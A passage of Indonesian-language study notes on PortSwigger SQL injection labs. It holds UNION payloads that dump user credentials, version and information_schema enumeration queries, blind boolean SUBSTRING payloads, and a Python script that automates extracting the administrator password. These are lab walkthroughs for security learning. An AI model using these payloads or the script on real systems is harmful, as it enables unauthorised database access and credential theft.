```

Ini menggunakan urutan double-pipe `||` yang merupakan operator concatenation string di Oracle. Kueri yang disuntikkan menggabungkan nilai field `username` dan `password`, dipisahkan oleh karakter `~`.

Hasil dari kueri berisi semua username dan password, misalnya:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

> **Catatan:** Basis data berbeda menggunakan sintaks berbeda untuk concatenation string. Untuk detail lebih lanjut, lihat [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


##### Lab: Serangan SQL Injection UNION, Mengambil Beberapa Nilai dalam Satu Kolom

Lab ini berisi kerentanan SQL injection di filter kategori produk. Hasil dari kueri dikembalikan di respons aplikasi jadi Anda bisa menggunakan serangan UNION untuk mengambil data dari tabel lain.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.6</summary>

Basis data berisi tabel berbeda bernama `users`, dengan kolom bernama `username` dan `password`.

Untuk menyelesaikan lab, lakukan serangan SQL injection UNION yang mengambil semua username dan password, dan gunakan informasi untuk login sebagai pengguna `administrator`.

> **Catatan:** Anda bisa menemukan beberapa payload berguna di [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![akses labs 0.6](images/lab-0.6-union-multiple-values/access-lab-0.6.png)

![Buka parameter Pets 0.6](images/lab-0.6-union-multiple-values/Open-Pets-parameter-0.6.png)

![intercept dan repeater 0.6](images/lab-0.6-union-multiple-values/intercept-and-repeater-0.6.png)

![error 0.6](images/lab-0.6-union-multiple-values/error-0.6.png)

![komentar 0.6](images/lab-0.6-union-multiple-values/comments-0.6.png)

![ORDER BY 1 0.6](images/lab-0.6-union-multiple-values/ORDER-BY-1-0.6.png)

![ORDER BY 2 0.6](images/lab-0.6-union-multiple-values/ORDER-BY-2-0.6.png)

![Error di ORDER BY 3 0.6](images/lab-0.6-union-multiple-values/error-in-ORDER-BY-3-0.6.png)

![ubah input tabel string 'a','b' respons error 0.6](images/lab-0.6-union-multiple-values/error-change-tables-input-string-0.6.png)

![ubah input tabel string 'null','null' respons sukses 0.6](images/lab-0.6-union-multiple-values/success-change-tables-input-null-0.6.png)

![ubah input tabel string null,'b' respons sukses 0.6](images/lab-0.6-union-multiple-values/success-change-tables-input-string-b-0.6.png)

![cek referensi sql injection cheatsheet dari portswigger](images/lab-0.6-union-multiple-values/portswigger-string-concatenation-reference-0.6.png)

![cek referensi sintaks concatenation string](images/lab-0.6-union-multiple-values/opsgrep-string-concatenation-references-0.6.png)

![ambil union select statement users dan password respons error 0.6](images/lab-0.6-union-multiple-values/union-select-statments-error-0.6.png)

![error input concatenation string |](images/lab-0.6-union-multiple-values/error-input-|-string-concatenation-0.6.png)

![sukses input concatenation string ||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||-string-concatenation-0.6.png)

![error input concatenation string |||](images/lab-0.6-union-multiple-values/error-input-|||-string-concatenation-0.6.png)

![error input concatenation string ||||](images/lab-0.6-union-multiple-values/error-input-||||-string-concatenation-0.6.png)

![sukses input concatenation string ||''||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||''||-string-concatenation-0.6.png)

![sukses input concatenation string ||'_'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'_'||-string-concatenation-0.6.png)

![sukses input concatenation string ||'+'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'+'||-string-concatenation-0.6.png)

![sukses input concatenation string ||'~'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'~'||-string-concatenation-0.6.png)

![testing login administrator users dan password leak](images/lab-0.6-union-multiple-values/login-0.6.png)

![sukses login administrator users dan password](images/lab-0.6-union-multiple-values/success-login-0.6.png)

##### Tutorial

1. Buka Burpsuite dan sadap parameter `Pets`
2. Sadap permintaan dan kirim ke repeater.
3. Modifikasi untuk melihat perilaku permintaan kirim input `'` mendapat respons error kode 500.
4. Modifikasi permintaan kirim input `'--` untuk komentar mendapat respons 200 sukses.
5. Tentukan kolom yang rentan digunakan kueri dengan `ORDER BY`

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
6. Berhasil mendeteksi error kolom di `ORDER BY 3`
7. Tentukan tipe data kolom yang digunakan `UNION SELECT`
8. Kirim UNION SELECT untuk keduanya tipe data string `'A' and 'b'` untuk cek validasi tabel.
9. Karena statement kolom ditemukan di `3` Coba `UNION SELECT` ini:

```SQL
' UNION SELECT 'A','B'-- Error kolom respons 500
' UNION SELECT NULL,NULL-- Sukses tentukan kolom baru respons 200
' UNION SELECT 'A',NULL-- Error kolom respons 500
' UNION SELECT  NULL,'B'-- Sukses spawn kolom 'B'
```
9. Cek cheatsheet cari tentang String Concatenation
> Referensi:
> - [SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
> - [SQL concatenation Syntax Reference](https://opsgrep.com/concatenation-in-sql-query/#toc-1-sql-concatenation-syntax-reference)
10. Masukkan dan beri nilai `UNION SELECT` untuk mengambil konten tabel `users`: 

```sql
' UNION SELECT username, password from users-- Error
' UNION SELECT username,|password from users-- error
' UNION SELECT username,||password from users-- sukses ambil pakai operator ||
' UNION SELECT username,|||password from users-- error
' UNION SELECT username,|||password from users-- error
' UNION SELECT username,||||password from users-- error
' UNION SELECT username,||''||password from users-- sukses ambil untuk buka ''
' UNION SELECT username,||'_'||password from users-- pakai operator `_`
' UNION SELECT username,||'+'||password from users-- pakai operator `+`
' UNION SELECT username,||'~'||password from users-- pakai operator `~`
```
11. Di respons HTTP dan frontend sukses dapat `username` dan `password` yang bocor dari tabel.

12. Coba login pengguna `administrator`

##### Referensi

<details>
<summary> 15. SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column | PortSwigger Lab — Michael Sommer</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=b5spqjjsxnw
Tujuan: Dalam video ini kita menyelesaikan lab PortSwigger Web Security Academy "SQL injection UNION attack, retrieving multiple values in a single column" – serangan UNION di mana kueri hanya memberi kita satu kolom teks yang bisa dipakai, tapi kita ingin dua data keluar darinya.
</details>

<details>
<summary>16. SQL Injection - Lab #6 SQL injection UNION attack, retrieving multiple values in a single column — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=yRVYoqR9vrI
Tujuan: Dalam video ini, kita membahas Lab #6 di trek SQL injection Web Security Academy. Lab ini berisi kerentanan SQL injection di field kategori produk. Untuk menyelesaikan lab, kita melakukan serangan UNION based SQL injection yang mengambil username dan password pengguna aplikasi dalam satu kolom.

</details>

<details>
<summary> 17. SQL Retrieving Multiple Values in Single Column - String Concatenation in SQL — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=lu_8CT0JwZs
Tujuan: Dalam video ini kita menyelesaikan Lab Burp Suite Web Academy 'SQL Injection Union Attack - Retrieving Multiple Values in a Single Column'.
</details>

</details>

Untuk mengeksploitasi kerentanan SQL injection, sering perlu menemukan informasi tentang basis data. Ini termasuk:

- Tipe dan versi software basis data.
- Tabel dan kolom yang dimiliki basis data.

### Memeriksa Basis Data dalam Serangan SQL Injection

Untuk mengeksploitasi kerentanan SQL injection, sering perlu menemukan informasi tentang basis data. Ini termasuk:

- Tipe dan versi software basis data.
- Tabel dan kolom yang dimiliki basis data.

#### Mengkueri Tipe dan Versi Basis Data

Anda berpotensi bisa mengidentifikasi tipe dan versi basis data dengan menyuntikkan kueri khusus provider untuk lihat apakah salah satunya berhasil.

Berikut adalah beberapa kueri untuk menentukan versi basis data untuk beberapa tipe basis data populer:

| Tipe Basis Data | Kueri |
| --- | --- |
| Microsoft SQL Server | `SELECT @@version` |
| MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

Misalnya, Anda bisa menggunakan serangan `UNION` dengan input berikut:
```sql
' UNION SELECT @@version--
```

Ini mungkin mengembalikan output berikut. Dalam kasus ini, Anda bisa mengonfirmasi basis data adalah Microsoft SQL Server dan melihat versinya:
```txt
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

##### Lab: Serangan SQL Injection, Mengkueri Tipe dan Versi Basis Data di MySQL dan Microsoft

Lab ini berisi kerentanan SQL injection di filter kategori produk. Anda bisa menggunakan serangan UNION untuk mengambil hasil dari kueri yang disuntikkan.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.7</summary>

Untuk menyelesaikan lab, tampilkan string versi basis data.

> **Catatan:** Anda bisa menemukan beberapa payload berguna di [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Buka labs 0.7](images/lab-0.7-database-version/open-labs-0.7.png)

![Klik parameter gift](images/lab-0.7-database-version/gift-parameter-0.7.png)

![Buka HTTP history kirim ke repeater parameter Gifts request 0.7](images/lab-0.7-database-version/http-history-to-repeater-0.7.png)

![testing error 0.7](images/lab-0.7-database-version/error-0.7.png)

![komentar error -- 0.7](images/lab-0.7-database-version/error-comment-0.7.png)

![sukses komentar pakai operator --+ 0.7](images/lab-0.7-database-version/success-comment-0.7.png)

![coba order by 1 0.7](images/lab-0.7-database-version/order-by-1-0.7.png)

![coba order by 2 0.7](images/lab-0.7-database-version/order-by-2-0.7.png)

![sukses dapat error tempat nilai kolom order by 3 0.7](images/lab-0.7-database-version/error-order-by-3.0.7.png)

![beri nilai UNION SELECT pakai NULL 0.7](images/lab-0.7-database-version/give-union-select-null-null-0.7.png)

![coba input kolom string a 'VULN' untuk coba cari di respons dan frontend 0.7](images/lab-0.7-database-version/input-string-vuln-0.7.png)

![cek versi dari cheatsheet sql injection 0.7](images/lab-0.7-database-version/cheatsheet-0.7.png)

![coba input nilai @@version untuk cek versi basis data 0.7](images/lab-0.7-database-version/check-version-0.7.png)

##### Tutorial

1. Buka browser dan aktifkan proxy cari parameter `Gifts` lalu cek history kirim ke repeater sebuah permintaan.
2. Modifikasi beri nilai `'` untuk lihat perilaku HTTP error 500.
3. Modifikasi beri nilai komentar `--` kalau error kode 500 coba tambah `--+` dan kirim permintaan dapat komentar sukses load kode 200.
4. Modifikasi kirim nilai `ORDER BY` untuk cari error.
5. Jika sukses dapat error dari testing `ORDER BY`:
```sql
' ORDER BY 1--+ 200 OK
' ORDER BY 2--+ 200 OK
' ORDER BY 3--+ 500 Internal server erorr
```
6. Coba nilai `UNION SELECT` pakai NULL dan testing input string 'VULN' untuk coba tempat kolom.:
```SQL
' UNION SELECT NULL,NULL--+
' UNION SELECT 'VULN','VULN'--+
```
7. Terakhir coba beri nilai untuk cek nomor versi basis data pakai `@@VERSION`.
```SQL
' UNION SELECT @@version,'VULN'--+
```
8. Cheatsheet bisa temukan `Database version untuk cek info stack kayak Oracle, Microsoft, PostgreSQL, MySQL. Link [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
```txt
| Basis Data | Kueri |
| --- | --- |
| Oracle | `SELECT banner FROM v$version;` |
| Oracle | `SELECT version FROM v$instance;` |
| Microsoft SQL Server | `SELECT @@VERSION;` |
| PostgreSQL | `SELECT version();` |
| MySQL | `SELECT @@VERSION;` |
```

##### Referensi

<details>
<summary> 18. SQL Injection: Querying the Database Type and Version on MySQL and Microsoft | PortSwigger Lab — Michael Sommer</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=7afmKPDaZtw
Tujuan: Dalam episode ini, kita membawa SQL injection melampaui ekstraksi data dan menggunakannya untuk melewati autentikasi sepenuhnya. Dengan menyadap permintaan login di Burp Suite dan memanipulasi field username, kita login sebagai akun administrator — tanpa pernah mengetahui, atau memerlukan, kata sandi yang benar.
</details>

<details>
<summary>19. SQL Injection - Lab #8 SQLi attack, querying the database type and version on MySQL & Microsoft — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=MFTk_LNRW0g
Tujuan: Lab ini berisi kerentanan SQL injection di field kategori produk. Untuk menyelesaikan lab, kita melakukan serangan UNION based SQL injection yang mengkueri tipe dan versi basis data di database Microsoft dan MySQL.

</details>

<details>
<summary> 20. SQL Injection Attack - Querying the Database Type and Version MySQL and Microsoft — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=4UxUpsCZQfI
Tujuan: Dalam lab keamanan siber ini kita menjalankan serangan SQL injection di mana kita mengkueri versi MYSQL dari basis data yang berjalan di back end. 
</details>

</details>

#### Melihat Isi Basis Data

Kebanyakan tipe basis data (kecuali Oracle) memiliki sekumpulan view yang disebut information schema. Ini memberikan informasi tentang basis data.

Misalnya, Anda bisa mengkueri `information_schema.tables` untuk melihat daftar tabel di basis data:

```sql
SELECT * FROM information_schema.tables
```

Ini mengembalikan output seperti berikut:
```txt
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Output ini menunjukkan ada tiga tabel, bernama `Products`, `Users`, dan `Feedback`.

Kemudian Anda bisa mengkueri `information_schema.columns` untuk melihat kolom di tabel individual:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Ini mengembalikan output seperti berikut:

```txt
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Output ini menampilkan kolom di tabel yang ditentukan dan tipe data setiap kolom.

##### Lab: Serangan SQL Injection, Melihat Isi Basis Data pada Non-Oracle Database

Lab ini berisi kerentanan SQL injection di filter kategori produk. Hasil dari kueri dikembalikan di respons aplikasi jadi Anda bisa menggunakan serangan UNION untuk mengambil data dari tabel lain.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.8</summary>

Aplikasi punya fungsi login, dan basis data berisi tabel yang menyimpan username dan password. Anda perlu menentukan nama tabel ini dan kolomnya, lalu mengambil isi tabel untuk mendapatkan username dan password semua pengguna.

Untuk menyelesaikan lab, login sebagai pengguna `administrator`.

> **Catatan:** Anda bisa menemukan beberapa payload berguna di [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Buka labs 0.8](images/lab-0.8-database-contents/open-lab-0.8.png)

![Buka parameter Gifts dan aktif history 0.8](images/lab-0.8-database-contents/params-gift-active-proxy-0.8.png)

![kirim repeater 0.8](images/lab-0.8-database-contents/send-repeater-0.8.png)

![kirim repeater 0.8](images/lab-0.8-database-contents/send-repeater-0.8.png)

![test error 0.8](images/lab-0.8-database-contents/test-error-0.8.png)

![test komentar 0.8](images/lab-0.8-database-contents/test-comment-0.8.png)

![test order by 1 0.8](images/lab-0.8-database-contents/test-order-by-1-0.8.png)

![test order by 2 0.8](images/lab-0.8-database-contents/test-order-by-2-0.8.png)

![error order by 3 0.8](images/lab-0.8-database-contents/error-order-by-3-0.8.png)

![test union select null null 0.8](images/lab-0.8-database-contents/test-union-null-0.8.png)

![test union select a b 0.8](images/lab-0.8-database-contents/test-union-string-0.8.png)

![test listing tabel information schema 0.8](images/lab-0.8-database-contents/test-listing-tables-0.8.png)

![temukan tabel users 0.8](images/lab-0.8-database-contents/find-users-tables-0.8.png)

![sukses dapat kolom kredensial 0.8](images/lab-0.8-database-contents/success-get-credential-columns-0.8.png)

![sukses kredensial administrator 0.8](images/lab-0.8-database-contents/success-get-credential-administrator-0.8.png)

![verifikasi user dan password administrator 0.8](images/lab-0.8-database-contents/verify-credentials-0.8.png)

![sukses login user dan password administrator 0.8](images/lab-0.8-database-contents/success-login-credentials-0.8.png)

##### Tutorial

1. Ambil permintaan dari HTTP history lalu kirim ke repeater.
2. Input `'` untuk lihat perilaku error dan dapat komentar `--` untuk lihat respons sukses.
3. Coba cari error kolom pakai `ORDER BY`
```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- dapat error kolom
```
4. Tentukan jumlah kolom pakai `UNION SELECT`
```sql
' UNION SELECT NULL,NULL--
' UNION SELECT 'A','B'--
```
5. Gunakan payload berikut untuk mengambil daftar tabel di basis data
```sql
'+UNION SELECT table_name,+NULL FROM information_schema.tables--
```
6. Temukan nama kolom dengan nama tabel users untuk dapat kolom kredensial.
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE+table_name='users_abcdf'--
```
7. Salin dan tempel kolom kredensial yang ditemukan `username` dan `password` `administrator` pakai kolom kredensial dan nama tabel users.
```sql
' UNION SELECT username_abdcf,+password_abcdf FROM users_abcdf--
```
8. Login `username` dan `password`
9. Benar sukses login dengan akun `administrator`

##### Referensi

<details>
<summary> 21. List Database Content For Further Exploitation! — Intigriti</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=cC0_pFyvFtA 
Tujuan: kita akan melihat cara memeriksa basis data untuk tabel dan kolom yang bisa lebih lanjut digunakan di payload UNION.
</details>

<details>
<summary>22. SQL Injection - Lab #9 SQL injection attack, listing the database contents on non Oracle databases — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=JduM_dO8glw
Tujuan: Lab ini berisi kerentanan SQL injection di field kategori produk. Untuk menyelesaikan lab, kita melakukan serangan UNION based SQL injection pada database PostgreSQL yang mengambil username dan password semua pengguna aplikasi.

</details>

<details>
<summary> 23. SQL Injection: Listing Database Contents on Non-Oracle Databases | PortSwigger (OLD) — Michael Sommer</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=Kd810Iiv1dM
Tujuan: Episode ini adalah payoff untuk semua yang kita bangun di dua lab sebelumnya. Begitu kita konfirmasi kita tidak berurusan dengan Oracle, kita pakai `information_schema` — skema metadata standar, read-only, yang dibagi oleh MySQL, PostgreSQL, dan Microsoft SQL Server — untuk jalanin jalur penuh dari UNION-based SQL injection ke credential dump lengkap.

Kita enumerate tabel basis data lewat `information_schema.tables`, sempitkan ke kolom tabel spesifik lewat `information_schema.columns`, dan akhirnya ekstrak username dan password yang bekerja langsung lewat injeksi. Kita tutup lab dengan login sebagai `administrator` pakai kredensial yang baru kita tarik dari basis data — tidak butuh pesan error sama sekali, cuma satu sintaks konsisten yang bekerja identik di tiga engine basis data paling umum.

</details>

</details>

## Blind SQL Injection

Di bagian ini, kita jelaskan teknik untuk menemukan dan mengeksploitasi kerentanan blind SQL injection.

### Apa Itu Blind SQL Injection?

Blind SQL injection terjadi saat aplikasi rentan terhadap SQL injection, tapi respons HTTP-nya tidak berisi hasil dari kueri SQL yang relevan atau detail error basis data.

Banyak teknik seperti serangan `UNION` tidak efektif dengan kerentanan blind SQL injection. Ini karena mereka bergantung pada kemampuan melihat hasil kueri yang disuntikkan di dalam respons aplikasi. Masih memungkinkan mengeksploitasi blind SQL injection untuk akses data tidak sah, tapi teknik berbeda harus digunakan.

### Mengeksploitasi Blind SQL Injection dengan Memicu Respons Kondisional

Pertimbangkan aplikasi yang pakai cookie untuk mengumpulkan analitik penggunaan. Permintaan ke aplikasi menyertakan header cookie seperti ini:
```txt
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Saat permintaan berisi cookie `TrackingId` diproses, aplikasi pakai kueri SQL untuk menentukan apakah ini user yang dikenal:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Kueri ini rentan SQL injection, tapi hasil dari kueri tidak dikembalikan ke user. Namun, aplikasi berperilaku berbeda tergantung apakah kueri mengembalikan data. Jika Anda kirim `TrackingId` yang dikenali, kueri mengembalikan data dan Anda terima pesan "Welcome back" di respons.

Perilaku ini cukup untuk mengeksploitasi kerentanan blind SQL injection. Anda bisa mengambil info dengan memicu respons berbeda secara kondisional, bergantung pada kondisi yang disuntikkan.

#### Mengeksploitasi Blind SQL Injection dengan Memicu Respons Kondisional - Lanjutan

Untuk memahami cara eksploit ini kerja, asumsikan dua permintaan dikirim berisi nilai cookie `TrackingId` berikut secara bergantian:

```txt
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- Nilai pertama menyebabkan kueri mengembalikan hasil, karena kondisi `AND '1'='1` yang disuntikkan adalah true. Sebagai hasilnya, pesan "Welcome back" ditampilkan.
- Nilai kedua menyebabkan kueri tidak mengembalikan hasil, karena kondisi yang disuntikkan adalah false. Pesan "Welcome back" tidak ditampilkan.

Ini memungkinkan kita menentukan jawaban dari kondisi yang disuntikkan, dan mengekstrak data satu potong per satu waktu.

Misalnya, asumsikan ada tabel bernama `Users` dengan kolom `Username` dan `Password`, dan user bernama `Administrator`. Anda bisa menentukan password untuk user ini dengan mengirim serangkaian input untuk menguji password satu karakter per satu waktu.

Untuk melakukannya, mulai dengan input berikut:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Ini mengembalikan pesan "Welcome back", menandakan kondisi yang disuntikkan true, dan jadi karakter pertama password lebih besar dari `m`.

Berikutnya, kita kirim input berikut:

```sql
xyz ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Ini tidak mengembalikan pesan "Welcome back", menandakan kondisi yang disuntikkan false, dan jadi karakter pertama password tidak lebih besar dari `t`.

Akhirnya, kita kirim input berikut, yang mengembalikan pesan "Welcome back", dengan itu mengonfirmasi bahwa karakter pertama password adalah `s`:

```sql
xyz ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Kita bisa lanjutkan proses ini untuk secara sistematis menentukan password penuh untuk user `Administrator`.

> **Catatan:** Fungsi `SUBSTRING` disebut `SUBSTR` di beberapa tipe basis data. Untuk detail lebih lanjut, lihat SQL injection cheat sheet.

##### Lab: Blind SQL Injection dengan Respons Kondisional

Lab ini berisi kerentanan blind SQL injection. Aplikasi pakai cookie tracking untuk analitik, dan menjalankan kueri SQL yang berisi nilai cookie yang dikirimkan.

<details>
<summary>Detail Lab, Screenshot & Walkthrough 0.9</summary>

Hasil kueri SQL tidak dikembalikan, dan tidak ada pesan error yang ditampilkan. Tapi aplikasi menyertakan pesan `Welcome back` di halaman jika kueri mengembalikan baris manapun.

Basis data berisi tabel berbeda `users`, dengan kolom bernama `username` dan `password`. Anda perlu mengeksploitasi kerentanan blind SQL injection untuk mengetahui password user `administrator`.

> **Catatan:** Anda bisa menemukan beberapa payload berguna di [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![Buka lab 0.9](images/lab-0.9-blind-conditional-responses/open-lab-0.9.png)

![Klik My account 0.9](images/lab-0.9-blind-conditional-responses/go-my-login-0.9.png)

![Cek history /login dari my account untuk dapat request dan kirim repeater 0.9](images/lab-0.9-blind-conditional-responses/send-repeater-0.9.png)

![Di repeater lihat parameter cookie 0.9](images/lab-0.9-blind-conditional-responses/test-request-normal-0.9.png)

![Test single quote untuk lihat error blind welcome back 0.9](images/lab-0.9-blind-conditional-responses/test-single-quote-welcome-back-0.9.png)

![Test sintaks komentar 0.9](images/lab-0.9-blind-conditional-responses/test-comment-0.9.png)

![Verifikasi tabel users 0.9](images/lab-0.9-blind-conditional-responses/verify-users-table-0.9.png)

![Test panjang password > 1 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-1-0.9.png)

![Test panjang password > 15 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-15-0.9.png)

![Test panjang password > 20 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-20-0.9.png)

![Di hasil panjang password punya > 19 0.9](images/lab-0.9-blind-conditional-responses/test-length-gt-19-0.9.png)

![Ekstraksi substring progress 0.9](images/lab-0.9-blind-conditional-responses/test-substring-progress-0.9.png)

![Script Python 0.9](images/lab-0.9-blind-conditional-responses/python-script-0.9.png)

![Jalankan script Python 0.9](images/lab-0.9-blind-conditional-responses/run-python-script-0.9.png)

![Login sebagai administrator 0.9](images/lab-0.9-blind-conditional-responses/login-administrator-0.9.png)

![Lab solved 0.9](images/lab-0.9-blind-conditional-responses/lab-solved-0.9.png)

##### Tutorial

1. Sadap Permintaan Login

   Buka halaman lab dan sadap permintaan `GET /login` pakai Burp Suite. Setelah disadap, kirim permintaan ke Repeater untuk testing lanjutan.

2. Uji SQL Injection

   Cek apakah parameter cookie `TrackingId` rentan SQL injection dengan menambahkan single quote (`'`) ke valuenya:

   ```http
   TrackingId=7Itm5DEgpF70MXu9'
   ```

   Jika pesan `Welcome back!` menghilang setelah nambah single quote, menandakan input mungkin mempengaruhi kueri SQL.

3. Tentukan Sintaks Komentar SQL

   Tambahkan sintaks komentar SQL `--+` untuk mengakhiri sisa kueri asli:

   ```http
   TrackingId=7Itm5DEgpF70MXu9'--+
   ```

   Jika pesan `Welcome back!` muncul lagi, menandakan injeksi bekerja dan `--+` sukses mengomentari sisa statement SQL.

4. Verifikasi Keberadaan Tabel `users`

   Uji apakah tabel `users` ada pakai kondisi statis:

   ```sql
   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users LIMIT 1)='a'--+
   ```

   Jika pesan `Welcome back!` muncul, menandakan tabel `users` ada dan kondisi SQL yang disuntikkan evaluasi sukses.

5. Tentukan Panjang Password Administrator

   Pakai fungsi SQL `LENGTH()` untuk menentukan panjang password administrator.

   Mulai dengan angka relatif tinggi, lalu turunkan perlahan hingga kondisi evaluasi true:

   ```sql
   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--+

   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a'--+
   ```

   Dalam test ini, `LENGTH(password)>20` tidak mengembalikan pesan `Welcome back!`, sementara `LENGTH(password)>19` mengembalikan.

   Jadi, password administrator panjangnya 20 karakter.

6. Ekstrak Password Pakai `SUBSTRING()`

   Pakai fungsi SQL `SUBSTRING()` untuk uji password satu karakter per satu waktu.

   Ubah argumen numerik pertama untuk tentukan posisi karakter dan ganti `'a'` dengan karakter yang mau diuji.

   Untuk karakter pertama:

   ```sql
   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--+
   ```

   Untuk karakter kedua:

   ```sql
   TrackingId=7Itm5DEgpF70MXu9' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--+
   ```

   Jika pesan `Welcome back!` muncul, karakter yang diuji cocok dengan karakter di posisi itu.

7. Ulangi Proses untuk Semua 20 Karakter

   Ulangi langkah 6 untuk posisi 1 sampai 20 hingga semua karakter password administrator teridentifikasi.

8. Otomatisasi Ekstraksi dengan Python

   Untuk mempercepat proses, otomatisasi ekstraksi password pakai script Python berikut:

   ```python
   import requests
   import string

   # Set URL target login
   url = "https://0a10003803f349cf80be26a5007c00d1.web-security-academy.net/login"

   # Definisikan cookie session yang diperlukan
   tracking_id = "7Itm5DEgpF70MXu9"
   session = "3mQEAdAHV0kDtdwEARtu43bCdwniet64"

   # Definisikan karakter password yang mungkin
   chars = string.ascii_lowercase + string.digits
   password = ""

   # Ekstrak password karakter per karakter
   for position in range(1, 21):
       for char in chars:

           # Suntikkan kondisi Boolean ke cookie TrackingId
           cookies = {
               "TrackingId": f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--+",
               "session": session
           }

           # Kirim permintaan dan cek respons server
           response = requests.get(url, cookies=cookies)

           # Karakter cocok memicu pesan welcome
           if "Welcome back!" in response.text:
               password += char
               print(f"[+] {position}: {char} -> {password}")
               break

   # Cetak password yang diekstrak
   print(f"\nPassword: {password}")
   ```

9. Jalankan Script Python

   Install library yang dibutuhkan:

   ```bash
   pip install requests
   ```

   Lalu eksekusi script:

   ```bash
   python blind-sql-injection-conditional-responses.py
   ```

10. Login sebagai Administrator

    Begitu script mengekstrak semua 20 karakter, login pakai kredensial berikut:

    ```text
    Username: administrator
    Password: <password yang diekstrak>
    ```

11. Selesaikan Lab

    Jika login sukses, Anda akan dapat akses ke akun administrator, dan lab akan ditandai sebagai Solved.

##### Referensi

<details>
<summary> 24. Blind SQL Injection - How Does It Work? — z3nshell</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=W3zvXK9i75A
Tujuan: Dalam video ini kita jelaskan konsep blind SQL injection dan memakai lab Burp Academy untuk contoh bagaimana kerentanan ini dieksploitasi. 
</details>

<details>
<summary>25. SQL Injection - Lab #11 Blind SQL injection with conditional responses — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=LBG_n9fr8sM
Tujuan: Lab ini berisi kerentanan blind SQL injection. Untuk menyelesaikan lab, kita melakukan serangan blind based SQL injection pada basis data yang mengambil password user administrator di aplikasi.

</details>

</details>

## Error-based SQL Injection

Error-based SQL injection merujuk pada kasus di mana Anda bisa memakai pesan error untuk mengekstrak atau menyimpulkan data sensitif dari basis data, bahkan dalam konteks blind. Kemungkinannya bergantung pada konfigurasi basis data dan tipe error yang bisa Anda picu:

- Anda mungkin bisa menginduksi aplikasi mengembalikan respons error spesifik berdasarkan hasil ekspresi boolean. Anda bisa mengeksploitasi ini seperti respons kondisional yang kita lihat di bagian sebelumnya. Untuk info lebih lanjut, lihat Exploiting blind SQL injection by triggering conditional errors.
- Anda mungkin bisa memicu pesan error yang mengeluarkan data yang dikembalikan kueri. Ini efektif mengubah kerentanan blind SQL injection yang lain jadi terlihat. Untuk info lebih lanjut, lihat Extracting sensitive data via verbose SQL error messages.

#### Mengeksploitasi Blind SQL Injection dengan Memicu Error Kondisional

